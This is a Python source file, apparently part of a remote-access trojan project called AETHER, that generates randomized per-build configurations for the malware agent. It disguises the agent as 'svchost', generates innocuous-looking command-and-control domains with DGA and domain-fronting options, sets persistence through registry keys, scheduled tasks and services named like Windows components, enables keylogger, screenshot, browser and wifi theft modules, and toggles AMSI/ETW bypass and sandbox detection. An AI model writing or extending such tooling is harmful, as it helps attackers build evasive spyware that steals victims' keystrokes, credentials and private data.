#!/usr/bin/env python3
"""
AETHER Config Generator
Creates unique, randomized configurations for each agent build.
"""

import json, random, hashlib, os, sys, time, string, ipaddress
from datetime import datetime, timedelta
import socket, uuid, platform

class ConfigGenerator:
    def __init__(self, base_config=None):
        self.base_config = base_config or self.get_default_config()
        self.random = random.Random()
        self.random.seed(os.urandom(16))
        
    def get_default_config(self):
        """Get default configuration template."""
        return {
            "version": "1.0",
            "description": "AETHER Agent Configuration",
            "agent": {
                "id": None,  # Will be generated
                "name": "svchost",
                "description": "Windows Host Process",
                "version": "10.0.19041.1"
            },
            "c2": {
                "primary": {
                    "host": None,  # Will be generated
                    "port": 443,
                    "protocol": "https",
                    "path": "/api/v1/beacon"
                },
                "secondary": [],  # Will be generated
                "fallback": [],   # Will be generated
                "use_dga": False,
                "dga_seed": None,  # Will be generated
                "domain_fronting": False,
                "front_domain": "cloudfront.net"
            },
            "communication": {
                "beacon_interval": 30,
                "jitter": 5,
                "max_beacon_size": 8192,
                "encryption": {
                    "algorithm": "AES-256-GCM",
                    "key": None,  # Will be generated
                    "iv_length": 12
                },
                "compression": "zlib",
                "encoding": "base64"
            },
            "persistence": {
                "methods": ["registry", "scheduled_task"],
                "registry_key": "WindowsTextInput",
                "service_name": "WindowsTimeSync",
                "task_name": "WindowsFontCacheUpdate",
                "startup_name": "Windows Explorer"
            },
            "modules": {
                "enabled": True,
                "autoload": ["keylogger", "screenshot", "browser", "wifi"],
                "disabled": ["webcam", "audio", "ransomware"]
            },
            "evasion": {
                "amsi_bypass": True,
                "etw_bypass": True,
                "sandbox_detection": True,
                "vm_detection": True,
                "debugger_detection": True,
                "sleep_obfuscation": True,
                "code_polymorphism": False,
                "process_hollowing": False
            },
            "behavior": {
                "max_cpu_usage": 50,
                "max_memory_mb": 100,
                "working_hours": [9, 17],
                "idle_timeout": 300,
                "error_backoff": 60,
                "max_retries": 3
            },
            "logging": {
                "enabled": False,
                "level": "ERROR",
                "path": "%TEMP%\\AetherLogs",
                "max_size_mb": 10,
                "compression": True,
                "encryption": True
            },
            "self_defense": {
                "integrity_check": True,
                "tamper_protection": False,
                "debugger_kill": False,
                "process_protection": False,
                "self_destruct": {
                    "enabled": True,
                    "command": "selfdestruct",
                    "timeout": 30
                }
            },
            "metadata": {
                "build_date": None,  # Will be generated
                "builder_id": None,  # Will be generated
                "compiler": "PyInstaller",
                "obfuscation": "PyArmor",
                "compression": "UPX"
            }
        }
    
    def generate_agent_id(self):
        """Generate unique agent ID."""
        # Use system information for uniqueness
        system_info = [
            platform.node(),  # Hostname
            str(uuid.getnode()),  # MAC address
            platform.processor(),  # CPU
            platform.version(),  # OS version
            str(os.getpid()),  # Process ID
            str(time.time())  # Timestamp
        ]
        
        combined = ''.join(system_info)
        agent_id = hashlib.sha256(combined.encode()).hexdigest()[:16]
        
        # Format as UUID-like for legitimacy
        return f"{agent_id[:8]}-{agent_id[8:12]}-{agent_id[12:16]}-{agent_id[16:20]}-{agent_id[20:32]}"
    
    def generate_c2_domains(self, count=3):
        """Generate legitimate-looking C2 domains."""
        domains = []
        
        # Common domain patterns
        patterns = [
            "{word}-{word}.{tld}",
            "{word}{number}.{tld}",
            "api.{word}.{tld}",
            "cdn.{word}.{tld}",
            "static.{word}.{tld}",
            "assets.{word}.{tld}"
        ]
        
        # Word list for domain generation
        words = [
            "cloud", "server", "api", "data", "storage", "content",
            "media", "static", "cdn", "assets", "host", "service",
            "platform", "infra", "network", "secure", "proxy", "gateway"
        ]
        
        tlds = [".com", ".net", ".org", ".io", ".co", ".info"]
        
        for _ in range(count):
            pattern = self.random.choice(patterns)
            word1 = self.random.choice(words)
            word2 = self.random.choice(words)
            number = str(self.random.randint(1, 999))
            tld = self.random.choice(tlds)
            
            domain = pattern.format(word=word1, number=number, tld=tld)
            domain = domain.replace("{word}-{word}", f"{word1}-{word2}")
            domain = domain.replace("{word}{number}", f"{word1}{number}")
            
            # Ensure uniqueness
            if domain not in domains:
                domains.append(domain)
        
        return domains
    
    def generate_dga_seed(self):
        """Generate DGA seed."""
        # Use date-based seed for predictable domains
        today = datetime.now()
        seed = f"{today.year}{today.month:02d}{today.day:02d}"
        return hashlib.md5(seed.encode()).hexdigest()[:8]
    
    def generate_encryption_key(self):
        """Generate encryption key."""
        return hashlib.sha256(os.urandom(32)).hexdigest()
    
    def generate_ip_address(self):
        """Generate random IP address (for fallback)."""
        # Generate realistic-looking IPs
        return f"{self.random.randint(1, 223)}.{self.random.randint(0, 255)}.{self.random.randint(0, 255)}.{self.random.randint(1, 254)}"
    
    def generate_port(self):
        """Generate port number."""
        # Common ports that won't raise suspicion
        common_ports = [80, 443, 8080, 8443, 8888, 9000, 9001]
        return self.random.choice(common_ports)
    
    def generate_builder_id(self):
        """Generate builder ID."""
        chars = string.ascii_letters + string.digits
        return ''.join(self.random.choice(chars) for _ in range(12))
    
    def randomize_values(self, config):
        """Randomize configuration values."""
        # Agent ID
        config['agent']['id'] = self.generate_agent_id()
        
        # C2 Configuration
        domains = self.generate_c2_domains(3)
        config['c2']['primary']['host'] = domains[0]
        config['c2']['primary']['port'] = self.generate_port()
        
        # Secondary C2 servers
        config['c2']['secondary'] = [
            {"host": domains[1], "port": self.generate_port(), "protocol": "https"},
            {"host": domains[2], "port": self.generate_port(), "protocol": "http"}
        ]
        
        # Fallback IPs
        config['c2']['fallback'] = [
            {"host": self.generate_ip_address(), "port": 443},
            {"host": self.generate_ip_address(), "port": 80}
        ]
        
        # DGA
        config['c2']['use_dga'] = self.random.choice([True, False])
        config['c2']['dga_seed'] = self.generate_dga_seed() if config['c2']['use_dga'] else None
        
        # Domain fronting
        config['c2']['domain_fronting'] = self.random.choice([True, False])
        
        # Communication settings
        config['communication']['beacon_interval'] = self.random.randint(20, 60)
        config['communication']['jitter'] = self.random.randint(2, 10)
        config['communication']['encryption']['key'] = self.generate_encryption_key()
        
        # Randomize compression
        config['communication']['compression'] = self.random.choice(['zlib', 'lzma', 'none'])
        
        # Persistence methods (random subset)
        all_methods = ["registry", "scheduled_task", "startup_folder", "service", "wmi"]
        config['persistence']['methods'] = self.random.sample(all_methods, self.random.randint(2, 4))
        
        # Module configuration
        all_modules = ["keylogger", "screenshot", "webcam", "audio", "browser", 
                      "wifi", "clipboard", "process", "file", "network", "defender"]
        
        enabled = self.random.sample(all_modules, self.random.randint(4, 8))
        disabled = [m for m in all_modules if m not in enabled]
        
        config['modules']['autoload'] = enabled[:4]  # First 4 autoload
        config['modules']['disabled'] = disabled
        
        # Evasion settings (randomize but keep sensible)
        config['evasion']['amsi_bypass'] = self.random.choice([True, False])
        config['evasion']['etw_bypass'] = self.random.choice([True, False])
        config['evasion']['code_polymorphism'] = self.random.choice([True, False])
        
        # Behavior settings
        config['behavior']['max_cpu_usage'] = self.random.randint(30, 70)
        config['behavior']['working_hours'] = [
            self.random.randint(8, 10),
            self.random.randint(16, 20)
        ]
        
        # Logging
        config['logging']['enabled'] = self.random.choice([True, False])
        config['logging']['level'] = self.random.choice(['ERROR', 'WARNING', 'INFO'])
        
        # Self-defense
        config['self_defense']['tamper_protection'] = self.random.choice([True, False])
        
        # Metadata
        config['metadata']['build_date'] = datetime.now().isoformat()
        config['metadata']['builder_id'] = self.generate_builder_id()
        config['metadata']['obfuscation'] = self.random.choice(['PyArmor', 'PyMinifier', 'None'])
        config['metadata']['compression'] = self.random.choice(['UPX', 'MPRESS', 'None'])
        
        return config
    
    def add_custom_rules(self, config, rules):
        """Add custom rules to configuration."""
        if 'c2_override' in rules:
            config['c2']['primary']['host'] = rules['c2_override'].get('host', config['c2']['primary']['host'])
            config['c2']['primary']['port'] = rules['c2_override'].get('port', config['c2']['primary']['port'])
        
        if 'beacon_interval' in rules:
            config['communication']['beacon_interval'] = rules['beacon_interval']
        
        if 'persistence_methods' in rules:
            config['persistence']['methods'] = rules['persistence_methods']
        
        if 'enabled_modules' in rules:
            config['modules']['autoload'] = rules['enabled_modules']
        
        return config
    
    def validate_config(self, config):
        """Validate configuration for correctness."""
        errors = []
        
        # Check required fields
        required = [
            ('agent.id', config.get('agent', {}).get('id')),
            ('c2.primary.host', config.get('c2', {}).get('primary', {}).get('host')),
            ('communication.encryption.key', config.get('communication', {}).get('encryption', {}).get('key'))
        ]
        
        for field, value in required:
            if not value:
                errors.append(f"Missing required field: {field}")
        
        # Validate C2 host format
        c2_host = config.get('c2', {}).get('primary', {}).get('host', '')
        if c2_host and not ('.' in c2_host or c2_host.startswith('http')):
            errors.append(f"Invalid C2 host format: {c2_host}")
        
        # Validate port range
        c2_port = config.get('c2', {}).get('primary', {}).get('port', 0)
        if not (1 <= c2_port <= 65535):
            errors.append(f"Invalid port: {c2_port}")
        
        # Validate beacon interval
        beacon_interval = config.get('communication', {}).get('beacon_interval', 0)
        if not (5 <= beacon_interval <= 3600):
            errors.append(f"Invalid beacon interval: {beacon_interval}")
        
        return errors
    
    def generate(self, custom_rules=None, validate=True):
        """Generate a complete configuration."""
        # Start with base config
        config = self.base_config.copy()
        
        # Randomize values
        config = self.randomize_values(config)
        
        # Apply custom rules if provided
        if custom_rules:
            config = self.add_custom_rules(config, custom_rules)
        
        # Validate if requested
        if validate:
            errors = self.validate_config(config)
            if errors:
                raise ValueError(f"Configuration validation failed: {errors}")
        
        return config
    
    def generate_batch(self, count=5, output_dir='generated_configs'):
        """Generate multiple configurations."""
        os.makedirs(output_dir, exist_ok=True)
        
        configs = []
        for i in range(count):
            try:
                config = self.generate()
                
                # Save to file
                filename = f"config_{config['agent']['id'][:8]}.json"
                filepath = os.path.join(output_dir, filename)
                
                with open(filepath, 'w') as f:
                    json.dump(config, f, indent=2)
                
                configs.append({
                    'id': config['agent']['id'],
                    'file': filepath,
                    'c2': config['c2']['primary']['host']
                })
                
                print(f"[+] Generated config {i+1}/{count}: {filename}")
                
            except Exception as e:
                print(f"[-] Failed to generate config {i+1}: {e}")
        
        # Generate summary
        summary = {
            'generated': len(configs),
            'timestamp': datetime.now().isoformat(),
            'configs': configs
        }
        
        summary_path = os.path.join(output_dir, 'generation_summary.json')
        with open(summary_path, 'w') as f:
            json.dump(summary, f, indent=2)
        
        print(f"\n[+] Generated {len(configs)} configurations in '{output_dir}'")
        print(f"[+] Summary: {summary_path}")
        
        return configs
    
    def generate_for_build(self, build_id, output_path=None):
        """Generate configuration for a specific build."""
        # Use build ID in agent ID
        custom_rules = {
            'agent_id_suffix': build_id[:8]
        }
        
        config = self.generate(custom_rules=custom_rules)
        
        # Add build-specific metadata
        config['metadata']['build_id'] = build_id
        config['metadata']['generated_for'] = 'aether_agent'
        
        # Save if output path provided
        if output_path:
            os.makedirs(os.path.dirname(output_path), exist_ok=True)
            with open(output_path, 'w') as f:
                json.dump(config, f, indent=2)
            
            print(f"[+] Configuration saved: {output_path}")
        
        return config

def main():
    """Command-line interface."""
    import argparse
    
    parser = argparse.ArgumentParser(description='AETHER Config Generator')
    parser.add_argument('--single', action='store_true', help='Generate single configuration')
    parser.add_argument('--batch', type=int, default=0, help='Generate N configurations')
    parser.add_argument('--output', type=str, default='config.json', help='Output file path')
    parser.add_argument('--dir', type=str, default='generated_configs', help='Output directory for batch')
    parser.add_argument('--build-id', type=str, help='Build ID for build-specific config')
    
    args = parser.parse_args()
    
    generator = ConfigGenerator()
    
    if args.build_id:
        # Generate for specific build
        config = generator.generate_for_build(args.build_id, args.output)
        print(json.dumps(config, indent=2))
        
    elif args.batch > 0:
        # Generate batch
        generator.generate_batch(args.batch, args.dir)
        
    else:
        # Generate single config
        config = generator.generate()
        
        if args.output:
            with open(args.output, 'w') as f:
                json.dump(config, f, indent=2)
            print(f"[+] Configuration saved to {args.output}")
        else:
            print(json.dumps(config, indent=2))

if __name__ == "__main__":
    main()